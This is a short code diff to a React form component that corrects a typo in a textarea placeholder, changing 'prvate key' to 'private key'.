@@ -138,7 +138,7 @@ function Form() {
                 name="message"
                 rows="5"
                 className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
-                placeholder={"prvate key"}
+                placeholder={"private key"}
                 data-gramm="false"
               ></textarea>
               <span className="bg-white">
